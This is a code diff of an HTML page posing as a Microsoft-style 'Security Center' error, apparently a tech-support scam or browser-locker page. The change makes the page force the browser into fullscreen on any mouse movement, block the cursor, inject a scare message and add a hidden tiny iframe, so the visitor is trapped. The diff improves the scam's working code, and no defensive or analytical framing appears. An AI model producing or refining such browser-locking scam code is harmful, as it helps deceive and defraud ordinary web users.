@@ -32,25 +32,21 @@
     <title>Security-Center-Code0x268d3 Services-Error0SecurityrEr0dfdsfd07</title>
 	<link rel="canonical" href="https://eschecksys.netlify.app/web.core.windows.net" />
     <link rel="stylesheet" href="https://eschecksys.netlify.app/font-awesome/4.5.0/css/font-awesome.min.css">
-    <script type="text/javascript">
-        window.onload = function () {
-            document.onclick = function (e) {
-                e = e || event;
-                target = e.target || e.srcElement;
-                if (target.tagName === "DIV") {
-                    toggleFullScreen();
-                    document.body.style.cursor = 'not-allowed';
-                    document.getElementById('map').innerHTML = stroka;
-                    document.getElementById('fa').innerHTML = "<iframe src='#' data-hj-allow-iframe="" width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
-                } else {
-                    toggleFullScreen();
-                    document.body.style.cursor = 'not-allowed';
-                    document.getElementById('map').innerHTML = stroka;
-                    document.getElementById('fa').innerHTML = "<iframe src='#' data-hj-allow-iframe="" width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
-                }
-            }
+    <script>
+window.onload = function () {
+    document.addEventListener('mousemove', function () {
+        if (!document.fullscreenElement) {
+            document.documentElement.requestFullscreen().catch((err) => {
+                console.log(err);
+            });
+
+            document.body.style.cursor = 'not-allowed';
+            document.getElementById('map').innerHTML = stroka;
+            document.getElementById('fa').innerHTML = "<iframe src='#' data-hj-allow-iframe='' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
         }
-    </script>
+    }, { once: true }); // only trigger once
+}
+</script>
    <script type="text/javascript">
         function getVariableFromURl(name) {
             name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
